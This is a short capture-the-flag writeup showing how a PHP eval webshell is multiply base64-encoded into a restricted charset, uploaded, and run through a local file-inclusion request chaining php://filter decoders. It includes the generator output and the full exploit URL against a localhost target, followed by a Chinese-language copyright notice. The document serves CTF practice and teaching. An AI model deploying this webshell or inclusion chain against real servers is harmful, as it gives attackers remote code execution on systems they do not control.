#### Goals
 * Get the flag

#### Solution


#### Writeups

* Generate base64 encoded webshell via [python script](https://gist.github.com/WangYihang/a49c663237e68822dd4816e99534ca72)
```
# python exploit.py
[+] Base64 chars : abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/
[+] Plain : <?php eval($_REQUEST['c']);?>
[+] Start charset : [AGCT]
[+] Generating tables...
[+] Got 6 chars : ['a', 'd', 'L', '1', '0', '4']
[+] Got 21 chars : ['5', 'W', 'G', 'F', 'i', 'h', 'k', 'V', 'M', '/', 'N', 'R', 'u', 't', 'w', '8', 'x', 'B', 'Z', 'K', '4']
[+] Got 56 chars : ['+', '/', '1', '0', '3', '2', '5', '4', '7', '6', '9', '8', 'A', 'C', 'B', 'E', 'D', 'G', 'F', 'I', 'H', 'K', 'J', 'M', 'L', 'O', 'N', 'Q', 'P', 'S', 'R', 'U', 'T', 'W', 'V', 'Y', 'X', 'Z', 'a', 'c', 'b', 'e', 'd', 'g', 'f', 'i', 'h', 'k', 'm', 'l', 'o', 'n', 'q', 'p', 'y', 'x']
[+] Got 64 chars : ['+', '/', '1', '0', '3', '2', '5', '4', '7', '6', '9', '8', 'A', 'C', 'B', 'E', 'D', 'G', 'F', 'I', 'H', 'K', 'J', 'M', 'L', 'O', 'N', 'Q', 'P', 'S', 'R', 'U', 'T', 'W', 'V', 'Y', 'X', 'Z', 'a', 'c', 'b', 'e', 'd', 'g', 'f', 'i', 'h', 'k', 'j', 'm', 'l', 'o', 'n', 'q', 'p', 's', 'r', 'u', 't', 'w', 'v', 'y', 'x', 'z']
[+] Trying to encode data...
[+] The encoded data is saved to file (9984 Bytes) : AGCT
[+] Usage : php -r 'include("php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=AGCT");'
[+] Executing...
PHP Notice:  Undefined index: c in /root/AGCT on line 1
```
* Upload the encoded webshell `AGCT` to the server, eg: `index.php`
* Trigger php file inclusion using multiple base64-decode converters
```
http://127.0.0.1:8080/index.php?action=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=upload/index
```


## 版权

该题目复现环境尚未取得主办方及出题人相关授权，如果侵权，请联系本人删除（wangyihanger@gmail.com）
